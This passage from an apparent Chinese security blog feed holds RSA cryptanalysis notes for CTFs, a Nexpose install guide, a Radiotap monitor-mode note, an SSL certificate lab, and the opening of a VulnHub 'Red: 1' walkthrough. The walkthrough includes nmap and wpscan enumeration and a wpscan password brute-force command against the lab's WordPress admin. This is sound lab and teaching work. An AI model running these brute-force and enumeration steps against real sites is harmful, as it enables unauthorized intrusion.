class="math inline">\(x-M_2\)</span> 同时整除以上两个多项式。因此，我们可以求得两个多项式的最大公因子，如果最大公因子恰好是线性的话，那么我们就求得了 <span
class="math inline">\(M_2\)</span>。需要注意的是，在 <span
class="math inline">\(e=3\)</span> 的情况下，最大公因子一定是线性的。</p>
<p>这里我们关注一下 <span class="math inline">\(e=3\)</span>，且 <span
class="math inline">\(f(x)=ax+b\)</span> 的情况。首先我们有</p>
<p><span class="math display">\[C_1 \equiv M_1 ^3 \bmod N,M_1 \equiv
aM_2+b \bmod N\]</span></p>
<p>那么我们有</p>
<p><span class="math display">\[C_1 \equiv (aM_2+b)^3 \bmod N,C_2 \equiv
M_2^3 \bmod N\]</span></p>
<p>我们需要明确一下我们想要得到的是消息
m，所以需要将其单独构造出来。</p>
<p>首先，我们有式 1</p>
<p><span
class="math display">\[(aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3\]</span></p>
<p>再者我们构造如下式 2</p>
<p><span class="math display">\[(aM_2)^3-b^3 \equiv
(aM_2-b)(a^2M_2^2+aM_2b+b^2) \bmod N\]</span></p>
<p>根据式 1 我们有</p>
<p><span class="math display">\[a^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2)
\equiv C_1 \bmod N\]</span></p>
<p>继而我们有式 3</p>
<p><span class="math display">\[3b(a^2M_2^2+aM_2b+b^2) \equiv
C_1-a^3C_2+2b^3 \bmod N\]</span></p>
<p>那么我们根据式 2 与式 3 可得</p>
<p><span class="math display">\[(a^3C_2-b^3)*3b \equiv (aM_2-b)(
C_1-a^3C_2+2b^3 ) \bmod N\]</span></p>
<p>进而我们有</p>
<p><span
class="math display">\[aM_2-b=\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3}\]</span></p>
<p>进而</p>
<p><span class="math display">\[aM_2\equiv
\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3}\]</span></p>
<p>进而</p>
<p><span class="math display">\[M_2
\equiv\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\frac{b}{a}\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3}\]</span></p>
<p>上面的式子中右边所有的内容都是已知的内容，所以我们可以直接获取对应的消息。</p>
<p>有兴趣的可以进一步阅读 <a
href="https://www.iacr.org/archive/pkc2005/33860001/33860001.pdf">A New
Related Message Attack on RSA</a> 以及 <a
href="https://www.cs.unc.edu/~reiter/papers/1996/Eurocrypt.pdf">paper</a> 这里暂不做过多的讲解。</p>
<h3 id="known-high-bits-message-attack">3.12. Known High Bits Message
Attack</h3>
<h4 id="攻击条件-2">3.12.1. 攻击条件</h4>
<p>这里我们假设我们首先加密了消息 m，如下</p>
<p><span class="math display">\[C\equiv m^d \bmod N\]</span></p>
<p>并且我们假设我们知道消息 <span class="math inline">\(m\)</span>
的很大的一部分 <span class="math inline">\(m_0\)</span>，即 <span
class="math inline">\(m=m_0+x\)</span>，但是我们不知道 <span
class="math inline">\(x\)</span>。那么我们就有可能通过该方法进行恢复消息。这里我们不知道的
<span class="math inline">\(x\)</span> 其实就是多项式的根，需要满足
Coppersmith 的约束。</p>
<p>可以参考 <a
href="https://github.com/mimoo/RSA-and-LLL-attacks">https://github.com/mimoo/RSA-and-LLL-attacks</a>。</p>
<h3 id="coppersmiths-short-pad-attack">3.13. Coppersmith’s short-pad
attack</h3>
<p>待补……</p>
<h2 id="参考">4. 参考</h2>
<blockquote>
<ol type="1">
<li><a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_theory/">RSA
介绍 - CTF Wiki</a></li>
<li><a
href="https://blog.csdn.net/m0_59363292/article/details/121129579">RSA算法原理【超清晰】_rsa原理_JustFlamePlease的博客-CSDN博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/450180396">RSA ——
经典的非对称加密算法 - 知乎</a></li>
<li><a href="https://www.tr0y.wang/2017/11/06/CTFRSA">RSA 大礼包 -
Tr0y's Blog</a></li>
</ol>
</blockquote>
]]></content>
      <categories>
        <category>密码破解</category>
        <category>CTF</category>
        <category>Crypto</category>
        <category>RSA</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>NEXPOSE</title>
    <url>/2022/01/26/NEXPOSE/</url>
    <content><![CDATA[<p><strong>详见：<a href="https://www.wangan.com/docs/1801"
class="uri">https://www.wangan.com/docs/1801</a></strong></p>
<p><strong>简略见（含直接下载链接，无需企业邮箱验证）：<a
href="https://www.fujieace.com/hacker/rapid7-nexpose.html"
class="uri">https://www.fujieace.com/hacker/rapid7-nexpose.html</a></strong></p>
<p><strong>Nexpose Linux 安装步骤：</strong><br />
1、给予执行权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x NeXposeSetup-Linux64.bin</span><br></pre></td></tr></table></figure>
<p>2、直接运行 bin 后缀文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./NeXposeSetup-Linux64.bin</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220126173445143-1464037870.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220126173503525-1977488131.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220126173518776-1191554691.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220126173359557-684221408.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220126173602115-384200994.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220126173616506-863877342.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220126173627824-1650764493.png" /></p>
<p>3、安装完成后看是否成功？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/rapid7/nexpose/nsc</span><br><span class="line">./nsc.sh</span><br></pre></td></tr></table></figure>
<p>4、浏览器访问 <strong><a href="https://127.0.0.1:3780/"
class="uri">https://127.0.0.1:3780/</a></strong>登录页面</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220126175203914-1942614885.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220126175334856-1915165857.png" /></p>
<p>备注：该过程每次登录时都会出现！</p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>Radiotap 头部</title>
    <url>/2022/03/31/Radiotap%20%E5%A4%B4%E9%83%A8/</url>
    <content><![CDATA[<h2 id="radiotap头">1. RADIOTAP头</h2>
<ul>
<li>802.11帧发射和接收的事实标准（Radiotap并不遵循802.11的标准，但802.11依赖Radiotap完成通信过程）</li>
<li>Linux系统在驱动和API中内建支持Radiotap的解析</li>
<li>802.11帧发射之前，网卡驱动在802.11头前面添加Radiotap头，反之当网卡接收到无线帧时，驱动通知MAC层，此帧头包含Radiotap头</li>
<li>Radiotap为802.11帧传递额外信息，厂家可自定义，因此头长度不固定</li>
<li>不破坏原始头结构，增加传递的信息</li>
</ul>
<h2 id="radiotap包头分析">2. RADIOTAP包头分析</h2>
<h3 id="开启网卡的监听">1、开启网卡的监听</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># iw dev wlan0 interface add wlan0mon type monitor  </span></span><br><span class="line">root@kali:~<span class="comment"># ifconfig wlan0mon up</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220331204653638-675350569.png" /></p>
<h3 id="抓包分析">2、抓包分析</h3>
<ul>
<li><strong>Version (8bit)</strong> ，值始终为0</li>
<li><strong>Pad (8bit)</strong> ，未使用，只作为字段强制对其的占位</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220331210040001-1776684140.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220331211610959-1192566238.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220331211908641-843475541.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220331212234903-1009762595.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220331212728512-89853049.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
        <tag>802.11 协议</tag>
      </tags>
  </entry>
  <entry>
    <title>SSL 配置实验</title>
    <url>/2021/11/23/SSL%20%E9%85%8D%E7%BD%AE%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="实验目的"><strong>1. </strong> <strong>实验目的</strong></h2>
<ol type="1">
<li><p>掌握对Web数据进行SSL安全传输的技术</p></li>
<li><p>掌握证书申请的过程</p></li>
<li><p>熟悉X.509 v3证书格式</p></li>
</ol>
<h2 id="实验-内容"><strong>2. </strong> <strong>实验</strong>
<strong>内容</strong></h2>
<ol type="1">
<li><p>配置基于Web的SSL连接:</p></li>
<li><p>IIS服务器的启动;</p></li>
<li><p>证书服务的启动和独立根CA的安装;</p></li>
<li><p>服务器证书申请、 颁发和安装;</p></li>
<li><p>客户端证书申请、颁发和安装;</p></li>
<li><p>在服务器上配置SSL;</p></li>
<li><p>客户端通过SSL与服务器建立连接;</p></li>
<li><p>WireShark 抓包,分析SSL记录,并绘制SSL握手的流程。</p></li>
</ol>
<h2 id="实验-环境"><strong>3. </strong> <strong>实验</strong>
<strong>环境</strong></h2>
<p>安装Windows XP的计算机、安装Windows Server 2003
的计算机、IIS的Web服务器和证书服务、局域网。</p>
<h2 id="实验-步骤"><strong>4. </strong> <strong>实验</strong>
<strong>步骤</strong></h2>
<p>1、在服务器上安装IIS组件,并配置Web站点,如图1，图2所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215536910-167677042.png" /></p>
<p>图 1 安装IIS及配置</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215556462-858669701.png" /></p>
<p>图 2 配置Web服务器</p>
<p>2、使用IE浏览器输人IP地址访问本地站点,如图3所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215613344-1861434436.png" /></p>
<p>图 3 http 访问站点</p>
<p><strong>备注：由于本实验环境是在
IPSec实验环境基础上做的，证书已被安装和颁发过，以下仅作简要说明，部分截图来自书籍（网络安全协议实验教程）。</strong></p>
<p>3、在服务器.上安装CA组件,如图4所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215728730-1226309913.png" /></p>
<p>图 4 证书安装</p>
<p>4、初次安装没有AD(活动目录),所以只能创建独立CA,又因为是第一个CA,所以选择独立根CA,并选择自定义安装,如图5至图7所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215738241-492284806.png" /></p>
<p>图 5 设置 CA 名字</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215759811-566816393.png" /></p>
<p>图 6</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215813423-480659397.png" /></p>
<p>图 7</p>
<p>5、打开证书颁发机构查看,如图8所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215820779-2013366518.png" /></p>
<p>图 8</p>
<p>6、使用IIS查看默认站点关于证书的列表,如图9所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215829441-883068652.png" /></p>
<p>图 9</p>
<p>7、在Web服务器上设置SSL,生成证书申请,如图10所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215842337-1240734300.png" /></p>
<p>图 10</p>
<p>8、单击"安全通信"选项区域中的"服务器证书"按钮安装证书,选择新证书,如图11至图15所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215854784-907186431.png" /></p>
<p>图 11 服务器证书申请</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215903104-1365884889.png" /></p>
<p>图 12</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215910451-763150582.png" /></p>
<p>图 13</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215918039-643543879.png" /></p>
<p>图 14</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215927648-919049008.png" /></p>
<p>图 15</p>
<p>9、使用IE浏览器打开本地Web站点进人证书申请页面,如图16和图17所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215935626-1792274285.png" /></p>
<p>图 16 选择申请证书</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215943988-787850445.png" /></p>
<p>图 17</p>
<p>10、在提交一个证书申请中选择后者"BASE64编码的证书申请"，如图18所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123215953161-192506388.png" /></p>
<p>图 18</p>
<p>11、此时弹出文本框,需要输入内容,如图19 所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123220004102-679201777.png" /></p>
<p>图 19</p>
<p>12、找到之前保存的certreq.
txt,打开并把其内容全部复制到文本框中,然后单击"提交"按钮,完成以上步骤后证书被挂起。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123220012386-265272945.png" /></p>
<p>图 20</p>
<p>当证书申请被提交到证书颁发机构,下一步就要颁发证书了。</p>
<p>13、打开证书颁发机构工具,选择"挂起的申请"选项，如图21所示,可以看到刚才申请后被挂起的证书,然后选中挂起的证书,右击选择"颁发"命令。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123220019249-1027028589.png" /></p>
<p>图 21 颁发证书</p>
<p>14、使用Web形式访问证书申请页面,并选择下载证书,如图22所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123220026406-780543058.png" /></p>
<p>图 22 下载证书</p>
<p>15、在Web服务器上安装证书。再次打开IIS服务器找到站点属性,再次单击"服务器证书"按钮,之后选择处理被挂起的请求,如图23所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123220032452-1522213109.png" /></p>
<p>图 23</p>
<p>16、启用安全通道(SSL)。</p>
<p>打开站点属性，选择"安全通信"-&gt;"编辑"按钮,然后选中"要求安全通道"复选框即可,如图24所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123220039726-1494941945.png" /></p>
<p>图 24</p>
<p>17、xp使用HTTPS方式访问测试站点，如图25至图27所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123220047018-1171740896.png" /></p>
<p>图 25 已不允许http访问</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123220055777-1359632491.png" /></p>
<p>图 26 使用https访问</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123220101627-2113912863.png" /></p>
<p>图 27 抓包比较SSL应用前后数据包</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>Red: 1</title>
    <url>/2024/04/12/Red%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a href="https://www.vulnhub.com/entry/red-1,753/">Red: 1 ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts       </span><br><span class="line">10 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 600    </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      1      60  VMware, Inc.          </span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      4     240  VMware, Inc.        </span><br><span class="line">192.168.159.254 00:50:56:f2:60:81      3     180  VMware, Inc.        </span><br><span class="line">192.168.159.147 00:0c:29:42:b9:94      2     120  VMware, Inc.   </span><br></pre></td></tr></table></figure>
<p>靶机：192.168.159.147</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.159.147 -p1-65535 </span><br><span class="line">……</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-04 12:47 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.147 (192.168.159.147)</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 8d:53:65:83:52:52:c4:12:72:49:be:33:5d:d1:e7:1c (RSA)</span><br><span class="line">|   256 06:61:0a:49:86:43:64:ca:b0:0c:0f:09:17:7b:33:ba (ECDSA)</span><br><span class="line">|_  256 9b:8d:90:47:2a:c1:dc:11:28:7d:57:e0:8a:23:b4:69 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 5.8.1</span><br><span class="line">|_http-title: Hacked By Red &amp;<span class="comment">#8211; Your site has been Hacked! You\xE2\x80\x99ll neve...</span></span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/wp-admin/</span><br><span class="line">MAC Address: 00:0C:29:42:B9:94 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.62 ms 192.168.159.147 (192.168.159.147)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.42 seconds</span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 端口部署了 WordPress，看源码需要修改 hosts 让 redrocks.win 指向
10.0.3.8</p>
<p>wpscan 扫下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://redrocks.win/ --ignore-main-redirect --force  -e</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] URL: http://redrocks.win/ [192.168.159.147]</span><br><span class="line">[+] Started: Thu Apr  4 12:51:17 2024</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] robots.txt found: http://redrocks.win/robots.txt</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - /wp-admin/</span><br><span class="line"> |  - /wp-admin/admin-ajax.php</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://redrocks.win/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://redrocks.win/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://redrocks.win/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://redrocks.win/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;</span><br><span class="line"> |  - http://redrocks.win/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme <span class="keyword">in</span> use: twentytwentyone</span><br><span class="line"> | Location: http://redrocks.win/wp-content/themes/twentytwentyone/</span><br><span class="line"> | Last Updated: 2024-04-02T00:00:00.000Z</span><br><span class="line"> | Readme: http://redrocks.win/wp-content/themes/twentytwentyone/readme.txt</span><br><span class="line"> | [!] The version is out of <span class="built_in">date</span>, the latest version is 2.2</span><br><span class="line"> | Style URL: http://redrocks.win/wp-content/themes/twentytwentyone/style.css?ver=1.4</span><br><span class="line"> | Style Name: Twenty Twenty-One</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwentyone/</span><br><span class="line"> | Description: Twenty Twenty-One is a blank canvas <span class="keyword">for</span> your ideas and it makes the block editor your best brush. Wi...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> | Confirmed By: Css Style In 404 Page (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.4 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://redrocks.win/wp-content/themes/twentytwentyone/style.css?ver=1.4, Match: <span class="string">&#x27;Version: 1.4&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: 00:00:05 &lt;============================================================================================================================================================&gt; (652 / 652) 100.00% Time: 00:00:05</span><br><span class="line">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] No themes Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: 00:00:19 &lt;==========================================================================================================================================================&gt; (2575 / 2575) 100.00% Time: 00:00:19</span><br><span class="line"></span><br><span class="line">[i] No Timthumbs Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:01 &lt;=============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:01</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span><br><span class="line"> Checking DB Exports - Time: 00:00:00 &lt;===================================================================================================================================================================&gt; (75 / 75) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No DB Exports Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be <span class="built_in">set</span> to <span class="string">&quot;Plain&quot;</span> <span class="keyword">for</span> those to be detected)</span><br><span class="line"> Brute Forcing Attachment IDs - Time: 00:00:00 &lt;========================================================================================================================================================&gt; (100 / 100) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Medias Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;==============================================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] administrator</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://redrocks.win/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Sitemap (Aggressive Detection)</span><br><span class="line"> |   - http://redrocks.win/wp-sitemap-users-1.xml</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Thu Apr  4 12:51:51 2024</span><br><span class="line">[+] Requests Done: 3602</span><br><span class="line">[+] Cached Requests: 10</span><br><span class="line">[+] Data Sent: 995.596 KB</span><br><span class="line">[+] Data Received: 19.094 MB</span><br><span class="line">[+] Memory used: 275.73 MB</span><br><span class="line">[+] Elapsed time: 00:00:33</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试爆破下 administrator</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://redrocks.win/ --usernames administrator --passwords rockyou.txt</span><br></pre></td></tr></table></figure>
<p>未果……扫目录没扫到什么有价值信息</p>
<p>看了别人的 wp 说是
<code>http://redrocks.win/2021/10/24/hello-world/</code> 源码有提示
=&gt; 谷歌 Miessler 可找到个下面的仓库 =&gt;</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404050128914.png" /></p>
<p><a href="https://github.com/danielmiessler/SecLists">GitHub -
danielmiessler/SecLists: SecLists is the security tester's companion.
It's a collection of multiple types of lists used during security
assessments, collected in one place. List types include usernames,
passwords, URLs, sensitive data patterns, fuzzing payloads, web shells,
and many more.</a></p>
<p>=&gt; 利用 backdoor_list.txt 可扫到个
<code>NetworkFileManagerPHP.php</code> =&gt;
<code>NetworkFileManagerPHP.php</code> 存在文件包含漏洞</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404050132521.png" /></p>
